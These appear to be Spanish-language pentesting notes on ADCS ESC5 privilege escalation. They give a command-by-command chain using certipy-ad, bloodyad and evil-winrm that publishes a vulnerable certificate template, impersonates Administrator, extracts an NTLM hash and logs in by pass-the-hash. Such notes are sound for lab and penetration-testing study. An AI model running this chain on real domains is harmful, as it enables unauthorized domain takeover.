# ADCS Attacks 

Tags: #Windows #PrivEsc #ESC #Linux #ADCS #ESC5 

Es un servicio de infraestructura de clave pública de Microsoft
	- Emitir
	- Administrar
	- Publicar / Revocar certificados digitales 

Utilidades practicas:
	- Emitir certificados para autenticación en computadores / servidores
	- Acceder a redes Wifi EMpresariales (WPA - Enterprise)
	- Acceder a redes VPN

Componentes:
- CA (Autoridad Certificadora)
- Certificate Templates 
	- Quien emite el certificado
	- Duración 
	- Quien puede usarlo 
	- Los permisos 

# ESC 5 Overly Permissive ACLs on Certificate Authority

Se tiene permisos **GenericAll** sobre todo el objeto de la CA. 
Pasos:
	1. Buscar plantilla 'Vulnerable' pero NO PUBLICADA.
	2. Identificar que se tiene permisos totales 
	3. Publicar la plantilla vulnerable.

## Enumeración General 

```bash 
# Buscar certificados vulnerables 
❯ certipy-ad find -u 'user' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout

Donde se obtiene:
	- CA Name 
	- Template Name  
	- Enrollment Rights -> (Quién puede solicitar el certificado directamente)
	- Enabled = FALSE   # Quiere decir que la plantilla no esta publicada 
	- Enrollee Supplies Subject = TRUE   # Quiere decir que vulnerable a ESC1
```

## ESC 5: Forma 1

```bash 
Paso 1:
# Se buscan los permisos 
❯ bloodyad --host IP_DC -d enterprise.com -u user -p 'P@$$w0rd123!' get object "CN=Public Key Services,CN=Services,CN=Configuration,DC=enterprise,DC=com" --attr nTSecurityDescriptor --resolve-sd

	# Se busca el permiso de 'GenericAll'

❯ bloodyad --host IP_DC -d enterprise.com -u user -p 'P@$$w0rd123!' get object "CN=192.168.5.100,CN=Public Key Services,CN=Services,CN=Configuration,DC=enterprise,DC=com" --attr nTSecurityDescriptor --resolve-sd

# Muestra las plantillas habilitadas 
❯ bloodyad --host IP_DC -d enterprise.com -u user -p 'P@$$w0rd123!' get object "CN=192.168.5.100,CN=Public Key Services,CN=Services,CN=Configuration,DC=enterprise,DC=com" --attr certificateTemplates
```

```bash 
Paso 2:
# Publicar todas la plantillas 
❯ bloodyad --host IP_DC -d enterprise.com -u user -p 'P@$$w0rd123!' set object "CN=192.168.5.100,CN=Public Key Services,CN=Services,CN=Configuration,DC=enterprise,DC=com" certificateTemplates -v <Template>
```

```bash 
Paso 3:
# Solicitar un certificado como Administrador 
❯ certipy-ad req -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -ca 'CA' -template '<Template>' -upn 'Administrator@domain.local' -target IP_DC 

	# ca = Certificate Authority (CA), se obtiene del comando 'find' 
	# template = Nombre de la plantilla vulnerable 
	# upn = Es la identidad que quieres que represente el certificado (Administrator)

NOTA:
	- Se obtiene un archivo llamado 'administrator.pfx'

Paso 4:
# Autenticarse usando el certificado obtenido un TGT para obtener el HASH NTLM
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC

Paso 5:
# Conectarse al server como Administrator 
❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```